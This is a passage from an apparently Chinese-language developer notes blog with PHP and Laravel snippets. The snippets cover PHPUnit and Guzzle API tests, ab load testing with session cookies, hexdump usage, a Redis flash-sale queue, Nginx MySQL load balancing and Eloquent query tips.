class="title">testAction2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $response = $<span class="keyword">this</span>-&gt;client-&gt;post(<span class="string">'/post'</span>, [</span><br><span class="line">            <span class="string">'form_params'</span> =&gt; [</span><br><span class="line">                <span class="string">'name'</span> =&gt; <span class="string">'myname'</span>,</span><br><span class="line">                <span class="string">'age'</span> =&gt; <span class="number">20</span>,</span><br><span class="line">            ],</span><br><span class="line">        ]);</span><br><span class="line">        $body = $response-&gt;getBody();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//添加测试</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertEquals(<span class="number">200</span>, $response-&gt;getStatusCode());</span><br><span class="line">        $data = json_decode($body, <span class="literal">true</span>);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'errorno'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'errormsg'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertArrayHasKey(<span class="string">'data'</span>, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertEquals(<span class="number">0</span>, $data[<span class="string">'errorno'</span>]);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;assertInternalType(<span class="string">'array'</span>, $data[<span class="string">'data'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$ phpunit tests/unit/MyApiTest.php</span><br><span class="line">PHPUnit <span class="number">6.5</span><span class="number">.3</span> by Sebastian Bergmann and contributors.</span><br><span class="line"></span><br><span class="line">array:<span class="number">1</span> [</span><br><span class="line">  <span class="string">"origin"</span> =&gt; <span class="string">"61.135.152.130"</span></span><br><span class="line">]</span><br><span class="line">.F                                                                  <span class="number">2</span> / <span class="number">2</span> (<span class="number">100</span>%)</span><br><span class="line"></span><br><span class="line">Time: <span class="number">1.54</span> seconds, <span class="attr">Memory</span>: <span class="number">12.00</span>MB</span><br><span class="line"></span><br><span class="line">There was <span class="number">1</span> failure:</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>) Tests\Unit\MyApiTest::testAction2</span><br><span class="line">Failed asserting that an array has the key <span class="string">'errorno'</span>.</span><br><span class="line"></span><br><span class="line">D:\php_study\PHPTutorial\WWW\laravel\tests\Unit\MyApiTest.php:<span class="number">46</span></span><br><span class="line"></span><br><span class="line">FAILURES!</span><br><span class="line">Tests: <span class="number">2</span>, <span class="attr">Assertions</span>: <span class="number">5</span>, <span class="attr">Failures</span>: <span class="number">1.</span></span><br></pre></td></tr></table></figure>
<h3 id="guzzle并发"><a href="#guzzle并发" class="headerlink" title="guzzle并发"></a>guzzle并发</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">use GuzzleHttp\Client;</span><br><span class="line">use Illuminate\Console\Command;</span><br><span class="line">use Psr\Http\Message\ResponseInterface;</span><br><span class="line">use GuzzleHttp\Exception\RequestException;</span><br><span class="line">use GuzzleHttp\<span class="built_in">Promise</span>;</span><br><span class="line">$client = <span class="keyword">new</span> Client([</span><br><span class="line">            <span class="comment">// 基URI  https://www.goozp.com/article/56.html</span></span><br><span class="line">            <span class="string">'base_uri'</span> =&gt; <span class="string">'http://httpbin.org'</span>,</span><br><span class="line">            <span class="comment">// 设置默认请求参数</span></span><br><span class="line">            <span class="string">'timeout'</span>  =&gt; <span class="number">2.0</span>,</span><br><span class="line">        ]);</span><br><span class="line">                $promise = $client-&gt;requestAsync(<span class="string">'GET'</span>, <span class="string">'http://httpbin.org/get'</span>);</span><br><span class="line">        $promise-&gt;then(</span><br><span class="line">            <span class="function"><span class="keyword">function</span> (<span class="params">ResponseInterface $res</span>) </span>&#123;</span><br><span class="line">                echo $res-&gt;getStatusCode() . <span class="string">"\n"</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="function"><span class="keyword">function</span> (<span class="params">RequestException $e</span>) </span>&#123;</span><br><span class="line">                echo $e-&gt;getMessage() . <span class="string">"\n"</span>;</span><br><span class="line">                echo $e-&gt;getRequest()-&gt;getMethod();</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 初始化每一个非阻塞请求</span></span><br><span class="line">        $promises = [</span><br><span class="line">            <span class="string">'image'</span> =&gt; $client-&gt;getAsync(<span class="string">'/image'</span>),</span><br><span class="line">            <span class="string">'ip'</span> =&gt; $client-&gt;getAsync(<span class="string">'/ip'</span>),</span><br><span class="line">            <span class="string">'png'</span>   =&gt; $client-&gt;getAsync(<span class="string">'/image/png'</span>),</span><br><span class="line">            <span class="string">'jpeg'</span>  =&gt; $client-&gt;getAsync(<span class="string">'/image/jpeg'</span>),</span><br><span class="line">            <span class="string">'webp'</span>  =&gt; $client-&gt;getAsync(<span class="string">'/image/webp'</span>)</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待请求完成</span></span><br><span class="line">        $results = <span class="built_in">Promise</span>\unwrap($promises);dump($results[<span class="string">'ip'</span>]-&gt;getBody()-&gt;getContents());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过键名接收每一个结果</span></span><br><span class="line">        <span class="comment">// function.</span></span><br><span class="line">        dump($results[<span class="string">'image'</span>]-&gt;getHeader(<span class="string">'Content-Length'</span>)) ;</span><br><span class="line">        dump($results[<span class="string">'png'</span>]-&gt;getHeader(<span class="string">'Content-Length'</span>)) ;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.goozp.com/article/56.html" target="_blank" rel="noopener">Guzzle：PHP的HTTP客户端</a></p>
<h3 id="ab-登录"><a href="#ab-登录" class="headerlink" title="ab 登录"></a>ab 登录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先用账户和密码登录</span><br><span class="line">用开发者工具找到标识这个会话的Cookie值（Session ID）记下来</span><br><span class="line">执行命令：</span><br><span class="line">一个Cookie情况时：ab －n <span class="number">100</span> －C key＝value http:<span class="comment">//test.com/</span></span><br><span class="line">多个Cookie情况时，设置Header：ab -n <span class="number">100</span> -H “Cookie: Key1=Value1; Key2=Value2” http:<span class="comment">//test.com/</span></span><br></pre></td></tr></table></figure>
<h3 id="查看16进制"><a href="#查看16进制" class="headerlink" title="查看16进制"></a>查看16进制</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">'welcome'</span> &gt; file1</span><br><span class="line">$ hexdump file1</span><br><span class="line"><span class="number">0000000</span> <span class="number">6577</span> <span class="number">636</span>c <span class="number">6</span>d6f <span class="number">0</span>a65</span><br><span class="line"><span class="number">0000008</span></span><br><span class="line">$ hexdump -C file1</span><br><span class="line"><span class="number">00000000</span>  <span class="number">77</span> <span class="number">65</span> <span class="number">6</span>c <span class="number">63</span> <span class="number">6</span>f <span class="number">6</span>d <span class="number">65</span> <span class="number">0</span>a              |welcome.|</span><br><span class="line"><span class="number">00000008</span></span><br><span class="line">$ od -x file1</span><br><span class="line"><span class="number">0000000</span> <span class="number">6577</span> <span class="number">636</span>c <span class="number">6</span>d6f <span class="number">0</span>a65</span><br><span class="line"><span class="number">0000010</span></span><br><span class="line"></span><br><span class="line">$ od -xc file1</span><br><span class="line"><span class="number">0000000</span> <span class="number">6577</span> <span class="number">636</span>c <span class="number">6</span>d6f <span class="number">0</span>a65</span><br><span class="line">               w   e   l   c   o   m   e  \n</span><br><span class="line"><span class="number">0000010</span></span><br><span class="line">$ xxd file1</span><br><span class="line"><span class="number">0000000</span>: <span class="number">7765</span> <span class="number">6</span>c63 <span class="number">6</span>f6d <span class="number">650</span>a                    welcome.</span><br><span class="line">$ cat file2</span><br><span class="line"><span class="number">000000</span>: <span class="number">7765</span> <span class="number">6</span>c63 <span class="number">6</span>f6d <span class="number">650</span>a</span><br><span class="line">$ xxd -r file2</span><br><span class="line">welcome</span><br></pre></td></tr></table></figure>
<h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CREATE TABLE <span class="string">`redis_queue`</span>(</span><br><span class="line">    <span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">    <span class="string">`uid`</span> int(<span class="number">11</span>) NOT NULL DEFAULT <span class="string">`0`</span>,</span><br><span class="line">    <span class="string">`time_stamp`</span> varchar(<span class="number">24</span>) NOT NULL,</span><br><span class="line">    PRIMARY KEY(<span class="string">`id`</span>)</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">接收用户请求的user.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// 加载redis组件</span></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis -&gt; connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$redis_name = <span class="string">'miaosha'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收用户的id</span></span><br><span class="line">$uid = $_GET[<span class="string">'uid'</span>];</span><br><span class="line"><span class="comment">// 获取一下redis里面已有的数量</span></span><br><span class="line">$num = $redis-&gt;lLen($redis_name);</span><br><span class="line"><span class="comment">// 如果当天人数少于10的时候,则加入这个队列</span></span><br><span class="line"><span class="keyword">if</span> ($num &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    $redis-&gt;rPush($redis_name, $uid.<span class="string">'%'</span>.microtime());</span><br><span class="line">    echo $uid.<span class="string">'秒杀成功'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 如果当天人数已经达到了10个人,则返回秒杀已完成</span></span><br><span class="line">    echo <span class="string">'秒杀已结束'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$redis-&gt;close();</span><br><span class="line"> 处理队列的入库程序</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include <span class="string">'../include/db.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载redis组件</span></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis -&gt; connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$redis_name = <span class="string">'miaosha'</span>;</span><br><span class="line">$db= DB::getIntance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 死循环</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 从队列最左取出一个值来</span></span><br><span class="line">    $user = $redis-&gt;lPop($redis_name);</span><br><span class="line">    <span class="comment">// 然后判断这个值是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!$user || $user==<span class="string">'nil'</span>) &#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 切割出时间</span></span><br><span class="line">    $user_arr = explode(<span class="string">'%'</span>, $user);</span><br><span class="line">    $insert_data = array(</span><br><span class="line">        <span class="string">'uid'</span> =&gt; $user_arr[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'time_stamp'</span> =&gt; $user_arr[<span class="number">1</span>], </span><br><span class="line">        );</span><br><span class="line">    <span class="comment">// 保存到数据库中</span></span><br><span class="line">    $res = $db-&gt;insert(<span class="string">'redis_queue'</span>, $insert_data);</span><br><span class="line">    <span class="comment">// 数据库插入失败的时候的回滚机制</span></span><br><span class="line">    <span class="keyword">if</span> (!$res) &#123;</span><br><span class="line">        $redis-&gt;rPush($redis_name, $user);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//释放redis</span></span><br><span class="line">$redis -&gt; close();</span><br></pre></td></tr></table></figure>
<h3 id="将一组数字组合出一个最大值"><a href="#将一组数字组合出一个最大值" class="headerlink" title="将一组数字组合出一个最大值"></a>将一组数字组合出一个最大值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://www.raymondwu.net/2018/08/24/%E5%B0%86%E4%B8%80%E7%BB%84%E6%95%B0%E5%AD%97%E7%BB%84%E5%90%88%E5%87%BA%E4%B8%80%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%80%BC/</span></span><br><span class="line">$items = [<span class="number">50</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">9</span>];<span class="comment">//若有一个数组的值为 [50, 1, 2, 9]，那么它的最大组合值就是95021</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($items); $i++) &#123;</span><br><span class="line">	<span class="keyword">for</span> ($j = $i + <span class="number">1</span>; $j &lt; count($items); $j++) &#123;</span><br><span class="line">		$a = (string)$items[$i];</span><br><span class="line">		$b = (string)$items[$j];</span><br><span class="line">		<span class="keyword">if</span> ($a . $b &lt; $b . $a) &#123;</span><br><span class="line">			$items[$i] = $b;</span><br><span class="line">			$items[$j] = $a;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo implode(<span class="string">''</span>, $items);</span><br></pre></td></tr></table></figure>
<h3 id="Nginx-部署-MySQL-负载均衡"><a href="#Nginx-部署-MySQL-负载均衡" class="headerlink" title="Nginx 部署 MySQL 负载均衡"></a>Nginx 部署 MySQL 负载均衡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">        upstream dbserver &#123;</span><br><span class="line">                server <span class="number">172.16</span><span class="number">.121</span><span class="number">.131</span>:<span class="number">3306</span>;</span><br><span class="line">                server <span class="number">172.16</span><span class="number">.121</span><span class="number">.132</span>:<span class="number">3306</span>;</span><br><span class="line">                server <span class="number">172.16</span><span class="number">.121</span><span class="number">.133</span>:<span class="number">3306</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        server &#123;</span><br><span class="line">            listen <span class="number">3307</span>;</span><br><span class="line">            proxy_pass dbserver;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">定义了三台从数据库服务器，分别是 <span class="number">172.16</span><span class="number">.121</span><span class="number">.131</span> ~ <span class="number">133</span>。当我以 <span class="number">3307</span> 端口请求服务器时，服务器就会将我的请求代理到服务器组里，并按照顺序请求。</span><br></pre></td></tr></table></figure>
<h3 id="php-artisan"><a href="#php-artisan" class="headerlink" title="php artisan"></a>php artisan</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">php artisan list</span><br><span class="line">php artisan list make</span><br><span class="line">Available commands <span class="keyword">for</span> the <span class="string">"make"</span> namespace:</span><br><span class="line"> make:command      Create a <span class="keyword">new</span> command <span class="class"><span class="keyword">class</span></span></span><br><span class="line"> make:console      Create a new Artisan command</span><br><span class="line"> make:controller   Create a <span class="keyword">new</span> resource controller <span class="class"><span class="keyword">class</span></span></span><br><span class="line"> make:event        Create a new event class</span><br><span class="line"> make:middleware   Create a <span class="keyword">new</span> middleware <span class="class"><span class="keyword">class</span></span></span><br><span class="line"> make:migration    Create a new migration file</span><br><span class="line"> make:model        Create a <span class="keyword">new</span> Eloquent model <span class="class"><span class="keyword">class</span></span></span><br><span class="line"> make:provider     Create a new service provider class</span><br><span class="line"> make:request      Create a <span class="keyword">new</span> form request <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">php artisan migrate:refresh -h</span><br><span class="line">php artisan make:controller -h</span><br><span class="line"></span><br><span class="line">php artisan list app</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Eloquent-提示和技巧"><a href="#Laravel-Eloquent-提示和技巧" class="headerlink" title="Laravel Eloquent 提示和技巧"></a>Laravel Eloquent 提示和技巧</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$article = Article::find($article_id);</span><br><span class="line">$article-&gt;increment(<span class="string">'read_count'</span>);</span><br><span class="line">Article::find($article_id)-&gt;increment(<span class="string">'read_count'</span>);</span><br><span class="line">Article::find($article_id)-&gt;increment(<span class="string">'read_count'</span>, <span class="number">10</span>);      <span class="comment">// +10</span></span><br><span class="line">Product::find($produce_id)-&gt;decrement(<span class="string">'stock'</span>);               <span class="comment">// -1</span></span><br><span class="line">$user = User::findOrFail($id);</span><br><span class="line">$user = User::firstOrCreate([<span class="string">'email'</span> =&gt; $email]);</span><br><span class="line"> public <span class="function"><span class="keyword">function</span> <span class="title">approvedUsers</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    retrun $<span class="keyword">this</span>-&gt;hasMany(<span class="string">'App\User'</span>)-&gt;where(<span class="string">'approved'</span>, <span class="number">1</span>)-&gt;orderBy(<span class="string">'email'</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$users = User::find([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line">$users = User::where(<span class="string">'approved'</span>, <span class="number">1</span>)-&gt;get();</span><br><span class="line">$query = Author::query();</span><br><span class="line"></span><br><span class="line">$query-&gt;when(request(<span class="string">'filter_by'</span>) == <span class="string">'likes'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$q</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $q-&gt;where(<span class="string">'likes'</span>, <span class="string">'&gt;'</span>, request(<span class="string">'likes_amount'</span>, <span class="number">0</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$query-&gt;when(request(<span class="string">'filter_by'</span>) == <span class="string">'date'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$q</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $q-&gt;orderBy(<span class="string">'created_at'</span>, request(<span class="string">'ordering_rule'</span>, <span class="string">'desc'</span>));</span><br><span class="line">&#125;);</span><br><span class="line">$query = User::query();</span><br><span class="line"></span><br><span class="line">$query-&gt;when(request(<span class="string">'role'</span>, <span class="literal">false</span>), <span class="function"><span class="keyword">function</span> (<span class="params">$q</span>) <span class="title">use</span> (<span class="params">$role</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> $q-&gt;where(<span class="string">'role_id'</span>, $role);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$authors = $query-&gt;get();</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">author</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;belongsTo(<span class="string">'App\Author'</span>)-&gt;withDefault();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// whereRaw</span></span><br><span class="line">    $orders = DB::table(<span class="string">'orders'</span>)</span><br><span class="line">            -&gt;whereRaw(<span class="string">'price &gt; IF(state = "TX", ?, 100)'</span>, [<span class="number">200</span>])</span><br><span class="line">            -&gt;get();</span><br><span class="line">    <span class="comment">// havingRaw</span></span><br><span class="line">    Product::groupBy(<span class="string">'category_id'</span>)-&gt;havingRaw(<span class="string">'COUNT(*) &gt; 1'</span>)-&gt;get();</span><br><span class="line">    <span class="comment">// orderByRaw</span></span><br><span class="line">    User::where(<span class="string">'created_at'</span>, <span class="string">'&gt;'</span>, <span class="string">'2018-11-11'</span>)</span><br><span class="line">        -&gt;orderByRaw(<span class="string">'(updated_at - created_at) desc'</span>)</span><br><span class="line">        -&gt;get();</span><br><span class="line">     $task = Task::find(<span class="number">1</span>);</span><br><span class="line">      $newTask = $task-&gt;replicate();</span><br><span class="line">      $newTask-&gt;save();</span><br><span class="line">$product = Product::find(<span class="number">1</span>);</span><br><span class="line">$product-&gt;updated_at = <span class="string">'2018-11-11 11:11:11'</span>;</span><br><span class="line">$product-&gt;save([<span class="string">'timestamps'</span> =&gt; <span class="literal">false</span>]);      </span><br><span class="line">      </span><br><span class="line">$q-&gt;where(<span class="function"><span class="keyword">function</span> (<span class="params">$query</span>) </span>&#123;</span><br><span class="line">    $query-&gt;where(<span class="string">'gender'</span>, <span class="string">'Male'</span>)-&gt;where(<span class="string">'age'</span>, <span class="string">'&gt;'</span>, <span class="number">18</span>);</span><br><span class="line">&#125;)-&gt;orWhere(<span class="function"><span class="keyword">function</span> (<span class="params">$query</span>) </span>&#123;</span><br><span class="line">    $query-&gt;where(<span class="string">'gender'</span>, <span class="string">'Female'</span>)-&gt;orWhere(<span class="string">'age'</span>, <span class="string">'&gt;='</span>, <span class="number">65</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="判断图片"><a href="#判断图片" class="headerlink" title="判断图片"></a>判断图片</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">使用getimagesize()函数,如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。</span><br><span class="line">$file = $req-&gt;file(<span class="string">"imgfile"</span>);</span><br><span class="line">dump(getimagesize ($file-&gt;getRealPath()));</span><br><span class="line">array:<span class="number">7</span> [</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="number">3024</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="number">4032</span></span><br><span class="line">  <span class="number">2</span> =&gt; <span class="number">2</span></span><br><span class="line">  <span class="number">3</span> =&gt; <span class="string">"width="</span><span class="number">3024</span><span class="string">" height="</span><span class="number">4032</span><span class="string">""</span></span><br><span class="line">  <span class="string">"bits"</span> =&gt; <span class="number">8</span></span><br><span class="line">  <span class="string">"channels"</span> =&gt; <span class="number">3</span></span><br><span class="line">  <span class="string">"mime"</span> =&gt; <span class="string">"image/jpeg"</span></span><br><span class="line">]</span><br><span class="line">$imgUrl = <span class="string">"http://www.baidu.com/img/shouye_b5486898c692066bd2cbaeda86d74448.gif"</span>;</span><br><span class="line">$data = file_get_contents($imgUrl);</span><br><span class="line"><span class="comment">//echo ($data);</span></span><br><span class="line">$im = imagecreatefromstring($data);</span><br><span class="line"><span class="keyword">if</span>($im != <span class="literal">false</span>)&#123;</span><br><span class="line">    echo <span class="string">'&lt;p&gt;图片正常...&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">'&lt;p&gt;图片已损坏...&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_img_by_source</span>(<span class="params">$source</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(bin2hex(substr($source,<span class="number">0</span>,<span class="number">2</span>)))&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'ffd8'</span> : <span class="keyword">return</span> <span class="string">'ffd9'</span> === bin2hex(substr($source,<span class="number">-2</span>));</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'8950'</span> : <span class="keyword">return</span> <span class="string">'6082'</span> === bin2hex(substr($source,<span class="number">-2</span>));</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'4749'</span> : <span class="keyword">return</span> <span class="string">'003b'</span> === 